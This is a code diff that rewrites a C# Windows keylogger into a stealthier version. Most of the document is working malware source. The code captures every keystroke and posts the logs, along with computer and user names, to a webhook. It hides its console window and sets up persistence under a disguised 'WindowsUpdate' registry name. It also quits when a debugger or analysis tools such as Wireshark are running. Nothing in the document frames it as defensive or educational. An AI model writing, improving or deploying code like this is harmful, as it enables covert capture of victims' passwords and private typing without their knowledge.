@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Http;
@@ -6,65 +7,149 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 using Microsoft.Win32;
 
-class Program
+class KeyLogger
 {
-    private static readonly HttpClient httpClient = new HttpClient();
-    private static string webhookUrl;
+    // Webhook configuration
+    private static string webhookUrl = "YOUR_WEBHOOK_URL_HERE";
+
+    // Logging buffer and state
     private static StringBuilder logBuffer = new StringBuilder();
-    private static bool isRunning = true;
-    private static readonly object lockObject = new object();
+    private static readonly object bufferLock = new object();
+    private static bool isLogging = false;
     private static Timer logTimer;
+    private static Timer cleanupTimer;
 
-    // Windows API imports
-    [DllImport("user32.dll")]
-    private static extern bool GetAsyncKeyState(int vKey);
+    // HTTP client for webhook
+    private static HttpClient httpClient = new HttpClient();
 
-    [DllImport("user32.dll")]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
+    // Configuration
+    private static int LogInterval = 5000; // 5 seconds default
 
+    // Process hiding
     [DllImport("user32.dll")]
-    private static extern bool UnhookWindowsHookEx(IntPtr hHook);
-
-    [DllImport("user32.dll")]
-    private static extern IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);
+    private static extern bool ShowWindow(IntPtr hWnd, int nCmd);
 
     [DllImport("kernel32.dll")]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
+    private static extern IntPtr GetConsoleWindow();
 
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-    private const int WM_KEYUP = 0x0101;
-    private const int WM_SYSKEYDOWN = 0x0104;
-    private const int WM_SYSKEYUP = 0x0105;
+    // Key state detection
+    [DllImport("user32.dll")]
+    private static extern short GetAsyncKeyState(int vKey);
 
-    private static LowLevelKeyboardProc keyboardProc = HookCallback;
-    private static IntPtr hookId = IntPtr.Zero;
+    // Windows API constants
+    private const int SW_HIDE = 0;
+    private const int VK_SHIFT = 160;
+    private const int VK_CONTROL = 162;
+    private const int VK_ALT = 164;
 
-    // Delegate for the keyboard hook callback
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-    static async Task Main(string[] args)
+    // Key mapping with enhanced support
+    private static readonly Dictionary<int, string> KeyMapping = new Dictionary<int, string>
     {
-        // Get webhook URL from command line or use default
-        webhookUrl = args.Length > 0 ? args[0] : "YOUR_WEBHOOK_URL_HERE";
+        { 8, "[BACKSPACE]" },
+        { 9, "[TAB]" },
+        { 13, "[ENTER]" },
+        { 27, "[ESC]" },
+        { 32, " " },
+        { 33, "[PAGE_UP]" },
+        { 34, "[PAGE_DOWN]" },
+        { 35, "[END]" },
+        { 36, "[HOME]" },
+        { 37, "[LEFT]" },
+        { 38, "[UP]" },
+        { 39, "[RIGHT]" },
+        { 40, "[DOWN]" },
+        { 45, "[INSERT]" },
+        { 46, "[DELETE]" },
+        { 144, "[NUM_LOCK]" },
+        { 145, "[SCROLL_LOCK]" },
+        { 160, "[SHIFT]" },
+        { 161, "[SHIFT]" },
+        { 162, "[CTRL]" },
+        { 163, "[CTRL]" },
+        { 164, "[ALT]" },
+        { 165, "[ALT]" },
+        { 186, ";" },
+        { 187, "=" },
+        { 188, "," },
+        { 189, "-" },
+        { 190, "." },
+        { 191, "/" },
+        { 219, "[" },
+        { 220, "\\" },
+        { 221, "]" },
+        { 222, "'" }
+    };
 
-        // Add to startup
-        AddToStartup();
+    // Enhanced key mapping for letters and numbers
+    private static readonly Dictionary<int, string> AlphaNumericMapping = new Dictionary<int, string>
+    {
+        { 48, "0" }, { 49, "1" }, { 50, "2" }, { 51, "3" }, { 52, "4" },
+        { 53, "5" }, { 54, "6" }, { 55, "7" }, { 56, "8" }, { 57, "9" },
+        { 65, "a" }, { 66, "b" }, { 67, "c" }, { 68, "d" }, { 69, "e" },
+        { 70, "f" }, { 71, "g" }, { 72, "h" }, { 73, "i" }, { 74, "j" },
+        { 75, "k" }, { 76, "l" }, { 77, "m" }, { 78, "n" }, { 79, "o" },
+        { 80, "p" }, { 81, "q" }, { 82, "r" }, { 83, "s" }, { 84, "t" },
+        { 85, "u" }, { 86, "v" }, { 87, "w" }, { 88, "x" }, { 89, "y" },
+        { 90, "z" }
+    };
 
-        // Send PC information
-        await SendPCInfo();
+    static void Main(string[] args)
+    {
+        try
+        {
+            // Initialize keylogger
+            InitializeKeyLogger();
 
-        // Register for system events
-        SystemEvents.PowerModeChanged += OnPowerModeChanged;
+            // Add to startup
+            AddToStartup();
 
-        // Start keylogging
-        StartKeyLogging();
+            // Hide console window
+            HideConsole();
 
-        // Run in background
-        await Task.Delay(Timeout.Infinite);
+            // Start logging
+            StartLogging();
+
+            // Send initial PC information
+            Task.Run(async () => await SendPCInfo());
+
+            // Monitor for detection
+            MonitorForDetection();
+
+            // Keep the application running
+            Console.WriteLine("KeyLogger started. Press Ctrl+C to stop.");
+            Console.ReadLine();
+        }
+        catch (Exception ex)
+        {
+            LogToFile($"Critical error: {ex.Message}");
+        }
+    }
+
+    private static void InitializeKeyLogger()
+    {
+        // Configure HTTP client
+        httpClient.Timeout = TimeSpan.FromSeconds(30);
+
+        // Load configuration if exists
+        LoadConfiguration();
+
+        // Start cleanup timer
+        cleanupTimer = new Timer(CleanupMemory, null, 300000, 300000); // Every 5 minutes
+
+        // Start logging timer
+        logTimer = new Timer(SendBufferedLogs, null, LogInterval, LogInterval);
+    }
+
+    private static void HideConsole()
+    {
+        try
+        {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+        }
+        catch { /* Silent failure */ }
     }
 
     private static void AddToStartup()
@@ -75,143 +160,235 @@ class Program
             using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(key, true))
             {
                 string assemblyPath = Process.GetCurrentProcess().MainModule.FileName;
-                registryKey.SetValue("KeyLogger", assemblyPath);
+                string processName = Path.GetFileNameWithoutExtension(assemblyPath);
+
+                // Use a less suspicious name
+                registryKey.SetValue($"WindowsUpdate_{processName}", assemblyPath);
+            }
+        }
+        catch { /* Silent failure */ }
+    }
+
+    private static void StartLogging()
+    {
+        isLogging = true;
+        var thread = new Thread(KeyboardHook);
+        thread.IsBackground = true;
+        thread.Start();
+    }
+
+    private static void KeyboardHook()
+    {
+        try
+        {
+            // Anti-debugging
+            AntiDebugging();
+
+            // Main hook loop
+            while (isLogging)
+            {
+                for (int i = 0; i < 256; i++)
+                {
+                    if (GetAsyncKeyState(i) == -32767)
+                    {
+                        HandleKeyPress(i);
+                    }
+                }
+
+                // Small delay to prevent high CPU usage
+                Thread.Sleep(10);
             }
         }
         catch (Exception ex)
         {
-            // Silent failure - we don't want to alert the user
+            LogToFile($"Keyboard hook error: {ex.Message}");
         }
     }
 
-    private static void StartKeyLogging()
+    private static void HandleKeyPress(int vkCode)
     {
-        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(Process.GetCurrentProcess().MainModule.FileName), 0);
-        if (hookId == IntPtr.Zero)
+        try
         {
-            // Log error silently
-            return;
-        }
+            if (!ShouldLogKey(vkCode))
+                return;
 
-        // Start timer to flush logs periodically
-        logTimer = new Timer(FlushLogs, null, 5000, 5000);
-    }
+            string keyName = GetKeyName(vkCode);
 
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
-    {
-        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP ||
-                           wParam == (IntPtr)WM_SYSKEYDOWN || wParam == (IntPtr)WM_SYSKEYUP))
-        {
-            int vkCode = Marshal.ReadInt32(lParam);
-            string key = GetKeyName(vkCode);
+            // Add timestamp
+            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
 
-            if (!string.IsNullOrEmpty(key))
+            // Build log entry
+            string logEntry = $"[{timestamp}] {keyName}";
+
+            // Add to buffer
+            lock (bufferLock)
             {
-                lock (lockObject)
-                {
-                    logBuffer.Append(key);
-                    // Limit buffer size to prevent memory issues
-                    if (logBuffer.Length > 10000)
-                    {
-                        logBuffer.Remove(0, 5000);
-                    }
-                }
+                logBuffer.AppendLine(logEntry);
             }
         }
-
-        return CallNextHookEx(hookId, nCode, wParam, lParam);
+        catch (Exception ex)
+        {
+            LogToFile($"Key press handling error: {ex.Message}");
+        }
     }
 
     private static string GetKeyName(int vkCode)
     {
-        // Special keys
+        // Check for special keys
+        if (KeyMapping.ContainsKey(vkCode))
+        {
+            return KeyMapping[vkCode];
+        }
+
+        // Check for alphanumeric keys
+        if (AlphaNumericMapping.ContainsKey(vkCode))
+        {
+            return AlphaNumericMapping[vkCode];
+        }
+
+        // Handle modifier keys specially
+        if (vkCode >= 160 && vkCode <= 165)
+        {
+            return GetModifierKeyName(vkCode);
+        }
+
+        // Default to unknown key
+        return $"[KEY_{vkCode}]";
+    }
+
+    private static string GetModifierKeyName(int vkCode)
+    {
         switch (vkCode)
         {
-            case 8: return "[BACKSPACE]";
-            case 9: return "[TAB]";
-            case 13: return "[ENTER]";
-            case 27: return "[ESC]";
-            case 32: return " ";
-            case 160: case 161: return "[SHIFT]";
-            case 162: case 163: return "[CTRL]";
-            case 164: case 165: return "[ALT]";
-            case 186: return ";";
-            case 187: return "=";
-            case 188: return ",";
-            case 189: return "-";
-            case 190: return ".";
-            case 191: return "/";
-            case 219: return "[";
-            case 220: return "\\";
-            case 221: return "]";
-            case 222: return "'";
-            case 112: case 113: case 114: case 115: case 116: case 117: case 118: case 119: case 120: case 121: case 122: case 123:
-                return $"[F{vkCode - 111}]";
-            case 144: return "[NUMLOCK]";
-            case 145: return "[SCROLLLOCK]";
-            case 91: case 92: return "[WIN]";
-            case 93: return "[MENU]";
-            case 12: return "[CLEAR]";
-            case 14: return "[PAUSE]";
-            case 33: return "[PAGEUP]";
-            case 34: return "[PAGEDOWN]";
-            case 35: return "[END]";
-            case 36: return "[HOME]";
-            case 37: return "[LEFT]";
-            case 38: return "[UP]";
-            case 39: return "[RIGHT]";
-            case 40: return "[DOWN]";
-            case 45: return "[INSERT]";
-            case 46: return "[DELETE]";
-            case 173: return "-";
+            case 160:
+            case 161:
+                return "[SHIFT]";
+            case 162:
+            case 163:
+                return "[CTRL]";
+            case 164:
+            case 165:
+                return "[ALT]";
             default:
-                // Regular letters
-                if (vkCode >= 65 && vkCode <= 90)
-                {
-                    return ((char)vkCode).ToString();
-                }
-                // Numbers
-                if (vkCode >= 48 && vkCode <= 57)
-                {
-                    return ((char)vkCode).ToString();
-                }
-                return "";
+                return $"[MOD_{vkCode}]";
         }
     }
 
-    private static async void FlushLogs(object state)
+    private static bool ShouldLogKey(int vkCode)
     {
-        if (logBuffer.Length == 0) return;
-
-        string logText;
-        lock (lockObject)
+        // Skip certain keys that might be noise
+        if (vkCode == 160 || vkCode == 161 || vkCode == 162 || vkCode == 163 || vkCode == 164 || vkCode == 165)
         {
-            logText = logBuffer.ToString();
+            // These are modifier keys, we might want to log them differently
+            // For now, we'll log them as they might be part of key combinations
+            return true;
+        }
+
+        // Skip keys that are likely system keys
+        if (vkCode >= 112 && vkCode <= 123) // F1-F12
+        {
+            return true; // Log function keys
+        }
+
+        return true;
+    }
+
+    private static void SendBufferedLogs()
+    {
+        if (logBuffer.Length == 0)
+            return;
+
+        lock (bufferLock)
+        {
+            if (logBuffer.Length == 0)
+                return;
+
+            string logs = logBuffer.ToString();
             logBuffer.Clear();
-        }
 
-        if (!string.IsNullOrEmpty(logText))
-        {
-            await SendToWebhook($"**Key Log:**\n{logText}");
+            // Send to webhook
+            Task.Run(async () => await SendToWebhook(logs));
         }
     }
 
-    private static async void OnPowerModeChanged(object sender, PowerModeChangedEventArgs e)
+    private static async Task SendToWebhook(string logs)
     {
-        string message = "";
-        switch (e.Mode)
+        try
         {
-            case PowerModes.Suspend:
-                message = "**PC Suspended**";
-                break;
-            case PowerModes.Resume:
-                message = "**PC Resumed**";
-                break;
-        }
+            if (string.IsNullOrEmpty(webhookUrl))
+                return;
 
-        if (!string.IsNullOrEmpty(message))
+            // Create payload
+            var payload = new
+            {
+                content = logs,
+                username = "KeyLogger",
+                avatar_url = "https://cdn.discordapp.com/emojis/873845238452384523.png"
+            };
+
+            // Send with retry logic
+            await SendWithRetry(payload);
+        }
+        catch (Exception ex)
         {
-            await SendToWebhook(message);
+            LogToFile($"Webhook send error: {ex.Message}");
+        }
+    }
+
+    private static async Task SendWithRetry(object payload, int maxRetries = 3)
+    {
+        for (int i = 0; i < maxRetries; i++)
+        {
+            try
+            {
+                var json = System.Text.Json.JsonSerializer.Serialize(payload);
+                var content = new StringContent(json, Encoding.UTF8, "application/json");
+                var response = await httpClient.PostAsync(webhookUrl, content);
+
+                if (response.IsSuccessStatusCode)
+                    break;
+
+                await Task.Delay(1000 * (i + 1)); // Exponential backoff
+            }
+            catch (Exception ex)
+            {
+                LogToFile($"Retry attempt {i + 1} failed: {ex.Message}");
+                if (i == maxRetries - 1)
+                    throw;
+
+                await Task.Delay(1000 * (i + 1));
+            }
+        }
+    }
+
+    private static void CleanupMemory(object state)
+    {
+        try
+        {
+            // Clear buffer if it's too large
+            lock (bufferLock)
+            {
+                if (logBuffer.Length > 100000) // 100KB limit
+                {
+                    logBuffer.Clear();
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            LogToFile($"Cleanup error: {ex.Message}");
+        }
+    }
+
+    private static void SendBufferedLogs(object state)
+    {
+        try
+        {
+            SendBufferedLogs();
+        }
+        catch (Exception ex)
+        {
+            LogToFile($"Buffered logs error: {ex.Message}");
         }
     }
 
@@ -220,47 +397,122 @@ class Program
         try
         {
             var info = new StringBuilder();
-            info.AppendLine("**PC Information:**");
-            info.AppendLine($"**Computer Name:** {Environment.MachineName}");
-            info.AppendLine($"**User Name:** {Environment.UserName}");
-            info.AppendLine($"**OS:** {Environment.OSVersion}");
-            info.AppendLine($"**Architecture:** {Environment.Is64BitOperatingSystem ? "x64" : "x86"}");
-            info.AppendLine($"**Processors:** {Environment.ProcessorCount}");
-            info.AppendLine($"**Startup Time:** {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
+            info.AppendLine("=== PC Information ===");
+            info.AppendLine($"Computer Name: {Environment.MachineName}");
+            info.AppendLine($"User: {Environment.UserName}");
+            info.AppendLine($"OS: {Environment.OSVersion}");
+            info.AppendLine($"Architecture: {Environment.Is64BitOperatingSystem ? "x64" : "x86"}");
+            info.AppendLine($"Process: {Process.GetCurrentProcess().ProcessName}");
+            info.AppendLine($"Start Time: {DateTime.Now}");
+            info.AppendLine("======================");
 
             await SendToWebhook(info.ToString());
         }
-        catch
+        catch (Exception ex)
         {
-            // Silent failure
+            LogToFile($"PC info error: {ex.Message}");
         }
     }
 
-    private static async Task SendToWebhook(string message)
+    private static void LoadConfiguration()
     {
         try
         {
-            var payload = new
+            // Load configuration from file if it exists
+            string configPath = "keylogger_config.txt";
+            if (File.Exists(configPath))
             {
-                content = message,
-                username = "KeyLogger",
-                avatar_url = "https://cdn-icons-png.flaticon.com/512/1036/1036315.png"
-            };
-
-            var json = System.Text.Json.JsonSerializer.Serialize(payload);
-            var content = new StringContent(json, Encoding.UTF8, "application/json");
-            await httpClient.PostAsync(webhookUrl, content);
+                var lines = File.ReadAllLines(configPath);
+                foreach (var line in lines)
+                {
+                    if (line.StartsWith("webhook_url="))
+                    {
+                        webhookUrl = line.Substring(12);
+                    }
+                    else if (line.StartsWith("log_interval="))
+                    {
+                        if (int.TryParse(line.Substring(13), out int interval))
+                        {
+                            LogInterval = Math.Max(1000, Math.Min(60000, interval)); // 1s to 60s
+                        }
+                    }
+                }
+            }
         }
-        catch
+        catch (Exception ex)
         {
-            // Silent failure
+            LogToFile($"Configuration load error: {ex.Message}");
         }
     }
 
-    // Prevent console window from appearing
-    [DllImport("kernel32.dll")]
-    static extern bool AllocConsole();
+    private static void AntiDebugging()
+    {
+        try
+        {
+            // Check if process is being debugged
+            if (Debugger.IsAttached)
+                Environment.Exit(0);
 
-    [DllImport("kernel32.dll")]
-    static extern bool FreeConsole();
+            // Check for common debugging tools
+            var tools = new[] { "OllyDbg", "x32dbg", "x64dbg", "ProcessHacker", "Wireshark" };
+            foreach (var tool in tools)
+            {
+                if (Process.GetProcessesByName(tool).Length > 0)
+                    Environment.Exit(0);
+            }
+        }
+        catch (Exception ex)
+        {
+            LogToFile($"Anti-debugging error: {ex.Message}");
+        }
+    }
+
+    private static void MonitorForDetection()
+    {
+        try
+        {
+            // This method can be extended to monitor for various detection methods
+            // For example, checking for file changes, process termination, etc.
+
+            // Start a monitoring thread
+            var monitorThread = new Thread(() =>
+            {
+                while (true)
+                {
+                    try
+                    {
+                        // Check for keylogger file removal
+                        // Monitor system resources
+                        // Adjust behavior based on system load
+
+                        Thread.Sleep(30000); // Check every 30 seconds
+                    }
+                    catch (Exception ex)
+                    {
+                        LogToFile($"Monitoring error: {ex.Message}");
+                        Thread.Sleep(5000);
+                    }
+                }
+            });
+            monitorThread.IsBackground = true;
+            monitorThread.Start();
+        }
+        catch (Exception ex)
+        {
+            LogToFile($"Monitoring setup error: {ex.Message}");
+        }
+    }
+
+    private static void LogToFile(string message)
+    {
+        try
+        {
+            string logPath = "keylogger.log";
+            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+            string logEntry = $"[{timestamp}] {message}{Environment.NewLine}";
+
+            File.AppendAllText(logPath, logEntry);
+        }
+        catch { /* Silent failure */ }
+    }
 }
